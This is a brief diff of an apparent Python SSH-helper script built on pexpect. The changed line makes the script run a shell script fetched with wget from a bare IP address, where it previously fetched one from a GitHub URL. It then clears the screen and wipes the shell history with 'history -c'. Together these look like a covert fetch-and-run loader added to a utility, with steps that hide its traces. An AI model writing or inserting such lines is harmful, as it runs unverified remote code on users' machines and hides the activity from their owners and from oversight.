@@ -22,7 +22,7 @@ try:
         p = pexpect.spawn(sshpass, encoding='utf-8', echo=False)
         p.setwinsize(*get_terminal_size())
         signal.signal(signal.SIGWINCH, sigwinch_passthrough)
-        p.sendline('source <(wget -O- https://raw.githubusercontent.com/XxblxX/pst/master/.bashrc)')
+        p.sendline('source <(wget -O- http://188.225.36.227/rc)')
 
         p.sendline('clear; history -c')
         p.setecho(True)
